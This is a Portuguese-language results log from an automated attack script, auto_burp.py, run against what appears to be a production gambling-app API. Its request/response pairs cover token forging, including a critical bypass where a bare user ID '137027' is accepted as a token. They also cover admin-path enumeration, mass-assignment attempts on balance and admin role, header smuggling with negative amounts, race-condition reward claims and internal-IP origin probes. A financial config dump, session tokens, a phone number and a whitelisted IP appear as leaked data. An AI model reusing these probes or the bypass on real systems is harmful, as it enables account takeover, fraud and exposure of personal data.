# Resultados do auto_burp.py

_Executado em: 2026-06-09T16:02:16.126823_

## Achados ordenados por severidade

### [CRITICAL] token_forging — T6 só userId

**Interpretação:** CRÍTICO: bypass total.

**Request:**
```json
{
  "token": "137027"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "msg": null
}
```

---

### [MEDIUM] config_dump — POST /prod-api/set/get

**Interpretação:** Config financeira/operacional totalmente exposta.

**Request:**
```json
{
  "path": "/prod-api/set/get"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "leaked_keys": [
    "withdraw_pay_rate",
    "withdraw_system_rate",
    "device_user_limit",
    "ip_user_limit",
    "recharge_amount_max",
    "recharge_amount_min",
    "mgm_config",
    "withdraw_config",
    "ab_condition"
  ],
  "ipWhites": "15.229.81.27",
  "withdraw_config": {
    "amount_day": "100.00",
    "handle_count_day": 10000,
    "count_user_day": 3,
    "amount_user_day": "5000.00",
    "always_amount": "10000.00"
  },
  "mgm_config": {
    "switch": "1",
    "register_reward": "6",
    "first_charge_reward": "0",
    "first_recharge_reward": "5",
    "second_recharge_reward": "10",
    "three_recharge_reward": "10",
    "bind_invite_code_bonus_reward": "50",
    "bind_invite_code_bonus_reward_validity": "72",
    "recharge_bonus_reward": [
      "50",
      "50",
      "50"
    ],
    "recharge_bonus_reward_validity": [
      "72",
      "72",
      "72"
    ],
    "recharge_reminder_email_title": "MGM-Reminder from Your Friend",
    "recharge_reminder_email_content": "Hey！You haven’t recharge yet? Come and get recharge bonus once complete your first deposit.",
    "invite_excessive_email_title": "MGM-Notice",
    "invite_excessive_email_content": "Dear Player, We are sorry to inform you that you cannot invite friends to join the Referral Billionaire Event temporarily due to your unusual invitation behavior.",
    "reward_top_num": "8",
    "reward_total_num": "8",
    "recharge_amount_1": "15",
    "recharge_amount_2": "100",
    "recharge_amount_3": "200"
  }
}
```

---

### [LOW] admin_paths — /japi/admin/user/list

**Interpretação:** Status interessante — code=500.

**Request:**
```json
{
  "path": "/japi/admin/user/list"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 500,
  "msg": "404 NOT_FOUND"
}
```

---

### [LOW] admin_paths — /japi/admin/finance

**Interpretação:** Status interessante — code=500.

**Request:**
```json
{
  "path": "/japi/admin/finance"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 500,
  "msg": "404 NOT_FOUND"
}
```

---

### [LOW] admin_paths — /japi/admin/player/list

**Interpretação:** Status interessante — code=500.

**Request:**
```json
{
  "path": "/japi/admin/player/list"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 500,
  "msg": "404 NOT_FOUND"
}
```

---

### [LOW] admin_paths — /japi/manage/user

**Interpretação:** Status interessante — code=500.

**Request:**
```json
{
  "path": "/japi/manage/user"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 500,
  "msg": "404 NOT_FOUND"
}
```

---

### [LOW] admin_paths — /manage/player

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/manage/player"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /manage/finance

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/manage/finance"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /system/admin

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/system/admin"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /system/config

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/system/config"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /system/log

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/system/log"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /superadmin

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/superadmin"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /backoffice

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/backoffice"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /operator

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/operator"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /staff

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/staff"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /internal

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/internal"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /debug

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/debug"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /actuator

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/actuator"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /actuator/health

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/actuator/health"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /actuator/env

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/actuator/env"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /actuator/heapdump

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/actuator/heapdump"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /actuator/mappings

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/actuator/mappings"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /swagger-ui.html

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/swagger-ui.html"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /swagger

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/swagger"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /v2/api-docs

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/v2/api-docs"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /v3/api-docs

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/v3/api-docs"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [LOW] admin_paths — /api-docs

**Interpretação:** Status interessante — code=?.

**Request:**
```json
{
  "path": "/api-docs"
}
```

**Response:**
```json
{
  "http": 200,
  "code": "?",
  "msg": ""
}
```

---

### [INFO] token_forging — T0 baseline (token original)

**Interpretação:** Linha de base — esperado code=200 e amount válido.

**Request:**
```json
{
  "token": "137027:1781031701:3001:7d1c5ecc5d72afe51577941456fcf765"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "msg": null,
  "data": {
    "amount": 0,
    "withdrawAmount": 0,
    "inviteAmount": 0
  }
}
```

---

### [INFO] token_forging — T1 uid=1 hash original

**Interpretação:** OK — backend rejeita uid trocado com hash original.

**Request:**
```json
{
  "token": "1:1781031701:3001:7d1c5ecc5d72afe51577941456fcf765"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 401,
  "msg": "token is expired！",
  "data": null
}
```

---

### [INFO] token_forging — T2 uid=137028 hash original

**Interpretação:** OK — backend rejeita uid trocado.

**Request:**
```json
{
  "token": "137028:1781031701:3001:7d1c5ecc5d72afe51577941456fcf765"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 401,
  "msg": "token is expired！",
  "data": null
}
```

---

### [INFO] token_forging — T3 timestamp futuro

**Interpretação:** OK — timestamp validado pelo hash.

**Request:**
```json
{
  "token": "137027:9999999999:3001:7d1c5ecc5d72afe51577941456fcf765"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 401,
  "msg": "token is expired！"
}
```

---

### [INFO] token_forging — T4 timestamp=0

**Interpretação:** OK — timestamp validado.

**Request:**
```json
{
  "token": "137027:0:3001:7d1c5ecc5d72afe51577941456fcf765"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 401,
  "msg": "token is expired！"
}
```

---

### [INFO] token_forging — T5 sem hash

**Interpretação:** OK — hash obrigatório.

**Request:**
```json
{
  "token": "137027:1781031701:3001:"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 401,
  "msg": "token is expired！"
}
```

---

### [INFO] token_forging — T7 hash uppercase

**Interpretação:** OK — comparação case-sensitive.

**Request:**
```json
{
  "token": "137027:1781031701:3001:7D1C5ECC5D72AFE51577941456FCF765"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 401,
  "msg": "token is expired！"
}
```

---

### [INFO] token_forging — T8 hash candidato: md5(uid:ts:port)

**Interpretação:** Hash candidato rejeitado (esperado).

**Request:**
```json
{
  "token": "137027:1781031701:3001:96d7f536ad2f16c5ce484f19596dafe8",
  "hash_recipe": "md5(uid:ts:port)"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 401,
  "msg": "token is expired！"
}
```

---

### [INFO] token_forging — T8 hash candidato: md5(uid:ts:port:)

**Interpretação:** Hash candidato rejeitado (esperado).

**Request:**
```json
{
  "token": "137027:1781031701:3001:b0e608e8db0ec64de4aa77d61197f9d8",
  "hash_recipe": "md5(uid:ts:port:)"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 401,
  "msg": "token is expired！"
}
```

---

### [INFO] token_forging — T8 hash candidato: md5(uid:ts)

**Interpretação:** Hash candidato rejeitado (esperado).

**Request:**
```json
{
  "token": "137027:1781031701:3001:f535cab4e54fe0f1a1802e5e9c432838",
  "hash_recipe": "md5(uid:ts)"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 401,
  "msg": "token is expired！"
}
```

---

### [INFO] token_forging — T8 hash candidato: md5(uid+ts+port)

**Interpretação:** Hash candidato rejeitado (esperado).

**Request:**
```json
{
  "token": "137027:1781031701:3001:e0177f31609ee743c5b54500187a227a",
  "hash_recipe": "md5(uid+ts+port)"
}
```

**Response:**
```json
{
  "http": 200,
  "code": 401,
  "msg": "token is expired！"
}
```

---

### [INFO] mass_assignment — balance

**Interpretação:** Aceito? Verificação no GET seguinte.

**Request:**
```json
{
  "path": "/prod-api/player/update",
  "body": {
    "balance": 999999
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 400,
  "msg": "Token expirou, faça login novamente"
}
```

---

### [INFO] mass_assignment — vip_level

**Interpretação:** Aceito? Verificação no GET seguinte.

**Request:**
```json
{
  "path": "/prod-api/player/update",
  "body": {
    "vipLevel": 99,
    "vip_level": 99
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 400,
  "msg": "Token expirou, faça login novamente"
}
```

---

### [INFO] mass_assignment — isAdmin

**Interpretação:** Aceito? Verificação no GET seguinte.

**Request:**
```json
{
  "path": "/prod-api/player/update",
  "body": {
    "isAdmin": true,
    "is_admin": 1
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 400,
  "msg": "Token expirou, faça login novamente"
}
```

---

### [INFO] mass_assignment — role

**Interpretação:** Aceito? Verificação no GET seguinte.

**Request:**
```json
{
  "path": "/prod-api/player/update",
  "body": {
    "role": "admin",
    "userType": "admin"
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 400,
  "msg": "Token expirou, faça login novamente"
}
```

---

### [INFO] mass_assignment — permissions

**Interpretação:** Aceito? Verificação no GET seguinte.

**Request:**
```json
{
  "path": "/prod-api/player/update",
  "body": {
    "permissions": [
      "admin",
      "superuser"
    ]
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 400,
  "msg": "Token expirou, faça login novamente"
}
```

---

### [INFO] mass_assignment — enable

**Interpretação:** Aceito? Verificação no GET seguinte.

**Request:**
```json
{
  "path": "/prod-api/player/update",
  "body": {
    "enable": 1
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 400,
  "msg": "Token expirou, faça login novamente"
}
```

---

### [INFO] mass_assignment — multiplo

**Interpretação:** Aceito? Verificação no GET seguinte.

**Request:**
```json
{
  "path": "/prod-api/player/update",
  "body": {
    "balance": 999999,
    "vipLevel": 99,
    "isAdmin": true,
    "role": "admin",
    "withdraw_amount": 999999
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 400,
  "msg": "Token expirou, faça login novamente"
}
```

---

### [INFO] mass_assignment — DIFF perfil antes/depois

**Interpretação:** Nenhum campo mudou — backend ignora updates privilegiados.

**Request:**
```json
{
  "compare": "GET /prod-api/player/info"
}
```

**Response:**
```json
{
  "diffs": {}
}
```

---

### [INFO] header_smuggling — baseline (amount=50)

**Interpretação:** Linha de base.

**Request:**
```json
{
  "body": {
    "token": "137027:1781031708:3001:5983927a16a2d6019414d7423ad7d332",
    "appPackageName": "com.slots.big",
    "appVersion": "1.0.0",
    "phone": "21998498419",
    "configId": "",
    "amount": 50,
    "qr": 1
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "msg": "success"
}
```

---

### [INFO] header_smuggling — header X-Original-Amount

**Interpretação:** Sem efeito — header ignorado.

**Request:**
```json
{
  "extra_headers": {
    "X-Original-Amount": "-100"
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "msg": "success"
}
```

---

### [INFO] header_smuggling — header X-Real-Amount

**Interpretação:** Sem efeito — header ignorado.

**Request:**
```json
{
  "extra_headers": {
    "X-Real-Amount": "-100"
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "msg": "success"
}
```

---

### [INFO] header_smuggling — header X-Amount

**Interpretação:** Sem efeito — header ignorado.

**Request:**
```json
{
  "extra_headers": {
    "X-Amount": "-100"
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "msg": "success"
}
```

---

### [INFO] header_smuggling — header X-Forwarded-Amount

**Interpretação:** Sem efeito — header ignorado.

**Request:**
```json
{
  "extra_headers": {
    "X-Forwarded-Amount": "-100"
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "msg": "success"
}
```

---

### [INFO] header_smuggling — header X-Forwarded-For

**Interpretação:** Sem efeito — header ignorado.

**Request:**
```json
{
  "extra_headers": {
    "X-Forwarded-For": "127.0.0.1"
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "msg": "success"
}
```

---

### [INFO] header_smuggling — header X-Forwarded-For

**Interpretação:** Sem efeito — header ignorado.

**Request:**
```json
{
  "extra_headers": {
    "X-Forwarded-For": "15.229.81.27"
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "msg": "success"
}
```

---

### [INFO] header_smuggling — header X-Real-IP

**Interpretação:** Sem efeito — header ignorado.

**Request:**
```json
{
  "extra_headers": {
    "X-Real-IP": "15.229.81.27"
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "msg": "success"
}
```

---

### [INFO] header_smuggling — header X-Admin

**Interpretação:** Sem efeito — header ignorado.

**Request:**
```json
{
  "extra_headers": {
    "X-Admin": "true"
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "msg": "success"
}
```

---

### [INFO] header_smuggling — header X-Admin-Override

**Interpretação:** Sem efeito — header ignorado.

**Request:**
```json
{
  "extra_headers": {
    "X-Admin-Override": "1"
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "msg": "success"
}
```

---

### [INFO] header_smuggling — header X-Internal

**Interpretação:** Sem efeito — header ignorado.

**Request:**
```json
{
  "extra_headers": {
    "X-Internal": "1"
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "msg": "success"
}
```

---

### [INFO] header_smuggling — header X-Debug

**Interpretação:** Sem efeito — header ignorado.

**Request:**
```json
{
  "extra_headers": {
    "X-Debug": "1"
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "msg": "success"
}
```

---

### [INFO] header_smuggling — header X-Original-URL

**Interpretação:** Sem efeito — header ignorado.

**Request:**
```json
{
  "extra_headers": {
    "X-Original-URL": "/prod-api/admin/finance"
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "msg": "success"
}
```

---

### [INFO] header_smuggling — header X-Rewrite-URL

**Interpretação:** Sem efeito — header ignorado.

**Request:**
```json
{
  "extra_headers": {
    "X-Rewrite-URL": "/prod-api/admin/finance"
  }
}
```

**Response:**
```json
{
  "http": 200,
  "code": 200,
  "msg": "success"
}
```

---

### [INFO] race — claim invite reward x8

**Interpretação:** Sem race — 0 aceito de 8.

**Request:**
```json
{
  "path": "/prod-api/invite/getBindRewardRecord",
  "concurrency": 8
}
```

**Response:**
```json
{
  "results": [
    {
      "thread": 1,
      "http": 200,
      "code": 400,
      "msg": "Token expirou, faça login novamente"
    },
    {
      "thread": 4,
      "http": 200,
      "code": 400,
      "msg": "Token expirou, faça login novamente"
    },
    {
      "thread": 7,
      "http": 200,
      "code": 400,
      "msg": "Token expirou, faça login novamente"
    },
    {
      "thread": 0,
      "http": 200,
      "code": 400,
      "msg": "Token expirou, faça login novamente"
    },
    {
      "thread": 6,
      "http": 200,
      "code": 400,
      "msg": "Token expirou, faça login novamente"
    },
    {
      "thread": 5,
      "http": 200,
      "code": 400,
      "msg": "Token expirou, faça login novamente"
    },
    {
      "thread": 3,
      "http": 200,
      "code": 400,
      "msg": "Token expirou, faça login novamente"
    },
    {
      "thread": 2,
      "http": 200,
      "code": 400,
      "msg": "Token expirou, faça login novamente"
    }
  ],
  "accepted_count": 0
}
```

---

### [INFO] origin_bypass — 192.10.0.168:3001

**Interpretação:** Não conectável de fora (esperado se está atrás de firewall).

**Request:**
```json
{
  "url": "http://192.10.0.168:3001/api/"
}
```

**Response:**
```json
{
  "error": "<urlopen error timed out>"
}
```

---

### [INFO] origin_bypass — 172.16.0.245:3001

**Interpretação:** Não conectável de fora (esperado se está atrás de firewall).

**Request:**
```json
{
  "url": "http://172.16.0.245:3001/api/"
}
```

**Response:**
```json
{
  "error": "<urlopen error timed out>"
}
```

---

